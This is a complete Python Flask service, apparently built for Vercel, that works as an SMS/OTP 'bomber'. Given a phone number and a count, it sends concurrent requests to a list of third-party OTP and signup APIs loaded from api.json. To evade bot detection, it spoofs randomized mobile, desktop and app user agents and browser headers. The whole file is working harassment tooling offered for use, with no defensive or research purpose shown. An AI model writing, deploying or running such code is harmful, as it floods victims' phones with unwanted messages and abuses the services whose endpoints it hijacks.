import json
import asyncio
import aiohttp
from flask import Flask, request, jsonify
import random
from typing import Dict, Any, List

# Import user_agent generator (install via requirements.txt)
try:
    from user_agent import generate_user_agent
except ImportError:
    generate_user_agent = lambda: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

app = Flask(__name__)

DEFAULT_CC = "91"
API_JSON_PATH = "api.json"
MAX_TOTAL_REQUESTS = 500   # safe limit for Vercel (adjust as needed)

# ---------- Random User-Agent functions (copied from your script) ----------
def _dalvik_agent():
    vr = ["1.6.0", "2.1.0", "2.1.2", "2.1.3", "2.2.0", "2.2.1", "2.3.0"]
    an = ["7.0", "7.1", "8.0", "8.1", "9", "10", "11", "12", "13", "14"]
    dev = ["SM-G960F", "SM-G975F", "SM-N960F", "Pixel 4", "Pixel 5", "Pixel 6", "Pixel 7", "Nexus 6", 
           "OnePlus 7T", "OnePlus 8", "OnePlus 9", "HUAWEI P30", "HUAWEI P40", "Xiaomi Mi 9", 
           "Xiaomi Mi 10", "Xiaomi Mi 11", "Redmi Note 8", "Redmi Note 9", "Redmi Note 10", 
           "OPPO Reno2", "OPPO Reno3", "OPPO Reno4", "Vivo V20", "Vivo V21", "Realme 7", "Realme 8",
           "Sony Xperia 1", "Sony Xperia 5", "LG G8", "LG V50", "Nokia 8.3", "Motorola Edge+"]
    sos = ["QP1A.190711.020", "RP1A.200720.012", "PPR1.180610.011", "RQ1A.210105.003",
           "RP1A.200720.011", "QKQ1.190910.002", "LMY47V", "MMB29M", "NRD90M", "OPM1.171019.011",
           "PKQ1.190522.001", "QKQ1.190825.002", "RKQ1.200826.002", "SP1A.210812.016"]
    nano = random.choice(vr)
    com = random.choice(an)
    mod = random.choice(dev)
    lp = random.choice(sos)
    return f"Dalvik/{nano} (Linux; U; Android {com}; {mod} Build/{lp})"

def _browser_agent():
    browsers = ['chrome', 'kiwi', 'brave', 'edge', 'firefox', 'samsung', 'opera', 'yandex', 'ucbrowser']
    browser = random.choice(browsers)
    lop = ["9", "10", "11", "12", "13", "14"]
    sms = ["Pixel 4", "Pixel 5", "Pixel 6", "Pixel 7", "Samsung Galaxy S21", "Samsung Galaxy S22", 
           "Samsung Galaxy S23", "Samsung Galaxy Note 20", "Samsung Galaxy Note 10", "Samsung Galaxy A52",
           "Samsung Galaxy A72", "OnePlus 9", "OnePlus 10 Pro", "OnePlus 11", "Xiaomi Mi 11", 
           "Xiaomi Mi 12", "Xiaomi Redmi Note 11", "Huawei P40", "Huawei P50", "Sony Xperia 1 III", 
           "Sony Xperia 5 III", "Google Nexus 5", "Google Nexus 6P", "LG G7", "LG V60", 
           "Motorola Moto G100", "Nokia 5.4", "Oppo Find X3", "Realme GT", "Vivo X60"]
    ml = random.randint(89, 120)
    oop = random.randint(537, 545)
    mmk = random.choice(lop)
    awq = random.choice(sms)
    
    if browser == "chrome":
        return f"Mozilla/5.0 (Linux; Android {mmk}; {awq}) AppleWebKit/{oop}.36 (KHTML, like Gecko) Chrome/{ml}.0.0.0 Mobile Safari/{oop}.36"
    elif browser == "kiwi":
        return f"Mozilla/5.0 (Linux; Android {mmk}; {awq}) AppleWebKit/{oop}.36 (KHTML, like Gecko) Kiwi/{ml}.0.0.0 Mobile Safari/{oop}.36"
    elif browser == "brave":
        return f"Mozilla/5.0 (Linux; Android {mmk}; {awq}) AppleWebKit/{oop}.36 (KHTML, like Gecko) Chrome/{ml}.0.0.0 Mobile Safari/{oop}.36 Brave/{ml}.0.0.0"
    elif browser == "edge":
        return f"Mozilla/5.0 (Linux; Android {mmk}; {awq}) AppleWebKit/{oop}.36 (KHTML, like Gecko) Chrome/{ml}.0.0.0 Mobile Safari/{oop}.36 EdgA/{ml}.0.0.0"
    elif browser == "firefox":
        ff_version = random.randint(90, 115)
        return f"Mozilla/5.0 (Android {mmk}; Mobile; rv:{ff_version}.0) Gecko/{ff_version}.0 Firefox/{ff_version}.0"
    elif browser == "samsung":
        return f"Mozilla/5.0 (Linux; Android {mmk}; {awq}) AppleWebKit/{oop}.36 (KHTML, like Gecko) SamsungBrowser/{random.randint(15, 20)}.0 Chrome/{ml}.0.0.0 Mobile Safari/{oop}.36"
    elif browser == "opera":
        return f"Mozilla/5.0 (Linux; Android {mmk}; {awq}) AppleWebKit/{oop}.36 (KHTML, like Gecko) Chrome/{ml}.0.0.0 Mobile Safari/{oop}.36 OPR/{random.randint(65, 75)}.0.0"
    elif browser == "yandex":
        return f"Mozilla/5.0 (Linux; Android {mmk}; {awq}) AppleWebKit/{oop}.36 (KHTML, like Gecko) Chrome/{ml}.0.0.0 YaBrowser/{random.randint(20, 23)}.3.0.0 Mobile Safari/{oop}.36"
    elif browser == "ucbrowser":
        uc_version = random.randint(12, 13)
        return f"Mozilla/5.0 (Linux; U; Android {mmk}; {awq}) AppleWebKit/{oop}.36 (KHTML, like Gecko) Version/4.0 Chrome/{ml}.0.0.0 Mobile Safari/{oop}.36 UCBrowser/{uc_version}.0.0.0"

def _ios_agent():
    los = ["14.0", "14.4", "14.8", "15.0", "15.1", "15.2", "15.3", "15.4", "15.5", "15.6", "15.7", 
           "16.0", "16.1", "16.2", "16.3", "16.4", "16.5", "16.6", "17.0", "17.1", "17.2"]
    dec = ["iPhone12,1", "iPhone12,3", "iPhone12,5", "iPhone13,1", "iPhone13,2", "iPhone13,3", 
           "iPhone13,4", "iPhone14,2", "iPhone14,3", "iPhone14,4", "iPhone14,5", "iPhone14,6",
           "iPhone14,7", "iPhone14,8", "iPhone15,2", "iPhone15,3", "iPhone15,4", "iPhone15,5",
           "iPad8,1", "iPad8,2", "iPad8,3", "iPad8,4", "iPad8,5", "iPad8,6", "iPad8,7", "iPad8,8",
           "iPad8,9", "iPad8,10", "iPad8,11", "iPad8,12", "iPad11,1", "iPad11,2", "iPad11,3", 
           "iPad11,4", "iPad11,6", "iPad11,7", "iPad13,1", "iPad13,2", "iPad13,4", "iPad13,5",
           "iPad14,1", "iPad14,2"]
    web = random.randint(600, 615)
    sf = random.randint(14, 18)
    nok = random.choice(los)
    mod = random.choice(dec)
    return f"Mozilla/5.0 ({'iPhone' if 'iPhone' in mod else 'iPad'}; CPU {mod.replace(',', '')} OS {nok.replace('.', '_')} like Mac OS X) AppleWebKit/{web}.1 (KHTML, like Gecko) Version/{sf}.0 Mobile/15E148 Safari/{web}.1"

def _desktop_agent():
    browsers = ['chrome', 'firefox', 'edge', 'opera', 'safari', 'brave']
    browser = random.choice(browsers)
    os_list = ['Windows NT 10.0', 'Windows NT 11.0', 'Macintosh; Intel Mac OS X 10_15_7', 
               'Macintosh; Intel Mac OS X 11_0_0', 'Macintosh; Intel Mac OS X 12_0_0',
               'X11; Linux x86_64', 'X11; Ubuntu; Linux x86_64', 'X11; Fedora; Linux x86_64']
    os_choice = random.choice(os_list)
    if browser == "chrome":
        version = random.randint(90, 120)
        return f"Mozilla/5.0 ({os_choice}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Safari/537.36"
    elif browser == "firefox":
        version = random.randint(90, 115)
        return f"Mozilla/5.0 ({os_choice}; rv:{version}.0) Gecko/20100101 Firefox/{version}.0"
    elif browser == "edge":
        version = random.randint(90, 120)
        return f"Mozilla/5.0 ({os_choice}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Safari/537.36 Edg/{version}.0.0.0"
    elif browser == "opera":
        version = random.randint(75, 90)
        return f"Mozilla/5.0 ({os_choice}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Safari/537.36 OPR/{version}.0.0.0"
    elif browser == "safari":
        version = random.randint(14, 17)
        return f"Mozilla/5.0 ({os_choice}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{version}.0 Safari/605.1.15"
    elif browser == "brave":
        version = random.randint(90, 120)
        return f"Mozilla/5.0 ({os_choice}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Safari/537.36 Brave/{version}.0.0.0"

def _mobile_app_agent():
    apps = ['Telegram', 'WhatsApp', 'Instagram', 'Facebook', 'Twitter', 'Discord', 'Signal']
    app = random.choice(apps)
    if app == "Telegram":
        versions = ["9.0", "9.1", "9.2", "9.3", "9.4", "9.5", "10.0", "10.1", "10.2"]
        return f"Telegram/{random.choice(versions)} (Android {random.choice(['9', '10', '11', '12', '13'])}; SDK {random.randint(28, 33)})"
    elif app == "WhatsApp":
        versions = ["2.23", "2.24", "2.25", "2.26", "2.27"]
        return f"WhatsApp/{random.choice(versions)}.{random.randint(1, 99)} Android/{random.randint(9, 13)}"
    elif app == "Instagram":
        versions = ["270.0", "271.0", "272.0", "273.0", "274.0", "275.0"]
        return f"Instagram {random.choice(versions)}.{random.randint(10, 99)} Android ({random.randint(28, 33)}/{random.randint(9, 13)}; {random.choice(['320dpi', '420dpi', '480dpi', '560dpi'])})"
    else:
        return generate_user_agent()

def _get_random_agent():
    agent_types = [_ios_agent, _browser_agent, _dalvik_agent, _desktop_agent, _mobile_app_agent, generate_user_agent]
    weights = [0.2, 0.3, 0.2, 0.1, 0.1, 0.1]
    chosen_agent = random.choices(agent_types, weights=weights, k=1)[0]
    try:
        return chosen_agent() if chosen_agent != generate_user_agent else generate_user_agent()
    except:
        return generate_user_agent()

def get_dynamic_headers(agent: str) -> dict:
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-IN,en;q=0.8,hi;q=0.6', 'hi-IN,en;q=0.7']),
        'Connection': 'keep-alive',
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
    }
    is_mobile = any(key in agent for key in ['Android', 'iPhone', 'iPad', 'Mobile', 'Dalvik', 'WhatsApp', 'Telegram', 'Instagram'])
    if is_mobile:
        headers.update({
            'Sec-Ch-Ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Android WebView";v="128"',
            'Sec-Ch-Ua-Mobile': '?1',
            'Sec-Ch-Ua-Platform': '"Android"' if 'Android' in agent else '"iOS"',
        })
    else:
        headers.update({
            'Sec-Ch-Ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"' if 'Windows' in agent else '"macOS"' if 'Mac' in agent else '"Linux"',
        })
    return headers
# ---------- End of UA functions ----------

def load_apis() -> List[Dict[str, Any]]:
    try:
        with open(API_JSON_PATH, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception as e:
        print(f"Error loading APIs: {e}")
        return []

def interpolate_string(s: str, phone: str, cc: str) -> str:
    s = s.replace("{no}", phone).replace("{cc}", cc)
    return s

def interpolate_body(body: Any, phone: str, cc: str) -> Any:
    if isinstance(body, dict):
        return {k: interpolate_body(v, phone, cc) for k, v in body.items()}
    elif isinstance(body, str):
        return interpolate_string(body, phone, cc)
    elif isinstance(body, list):
        return [interpolate_body(item, phone, cc) for item in body]
    else:
        return body

async def send_request(session: aiohttp.ClientSession, api: Dict[str, Any], phone: str, cc: str):
    name = api.get("name", "Unnamed")
    url = interpolate_string(api["url"], phone, cc)
    method = api.get("method", "POST").upper()
    headers = api.get("headers", {}).copy()
    # Add random UA and dynamic headers
    ua = _get_random_agent()
    dyn_headers = get_dynamic_headers(ua)
    dyn_headers['User-Agent'] = ua
    for k, v in dyn_headers.items():
        if k not in headers and k.lower() not in [h.lower() for h in headers]:
            headers[k] = v
    body_data = api.get("body")
    json_data = None
    form_data = None
    if body_data is not None:
        interpolated = interpolate_body(body_data, phone, cc)
        content_type = headers.get("Content-Type", "")
        if "application/json" in content_type:
            json_data = interpolated
        else:
            form_data = interpolated if isinstance(interpolated, dict) else interpolated
    try:
        async with session.request(method, url, headers=headers, json=json_data, data=form_data, timeout=15) as resp:
            status = resp.status
            text = await resp.text()
            preview = text[:100].replace('\n', ' ')
            print(f"[{status}] {name} -> {preview}")
            return status, text
    except Exception as e:
        print(f"[ERROR] {name} -> {str(e)}")
        return None, str(e)

async def run_bomber(apis: List[Dict], phone: str, cc: str, amount: int):
    total = len(apis) * amount
    if total > MAX_TOTAL_REQUESTS:
        # limit to avoid timeout
        factor = MAX_TOTAL_REQUESTS // len(apis)
        amount = factor if factor > 0 else 1
        print(f"Total requests {total} exceeds limit {MAX_TOTAL_REQUESTS}. Reducing amount to {amount}.")
    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(amount):
            for api in apis:
                tasks.append(send_request(session, api, phone, cc))
        results = await asyncio.gather(*tasks, return_exceptions=True)
    return results

@app.route('/send', methods=['GET'])
def send_otp():
    phone = request.args.get('phone')
    if not phone or not phone.isdigit():
        return jsonify({"error": "Missing or invalid 'phone' (digits only)"}), 400
    amount_str = request.args.get('amount', '1')
    if not amount_str.isdigit() or int(amount_str) < 1:
        return jsonify({"error": "Amount must be a positive integer"}), 400
    amount = int(amount_str)
    cc = request.args.get('cc', DEFAULT_CC)
    if not cc.isdigit():
        return jsonify({"error": "Country code must be digits"}), 400
    apis = load_apis()
    if not apis:
        return jsonify({"error": "No APIs loaded"}), 500
    total_expected = len(apis) * amount
    # Run the bomber synchronously (blocking) to ensure completion
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        results = loop.run_until_complete(run_bomber(apis, phone, cc, amount))
    finally:
        loop.close()
    success = sum(1 for r in results if r is not None and isinstance(r, tuple) and r[0] in (200, 201, 202, 204))
    return jsonify({
        "status": "completed",
        "total_sent": total_expected,
        "success_count": success,
        "message": f"Sent {amount} request(s) per API to +{cc}{phone}"
    }), 200

# Vercel requires the app to be named `app`
app = app

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)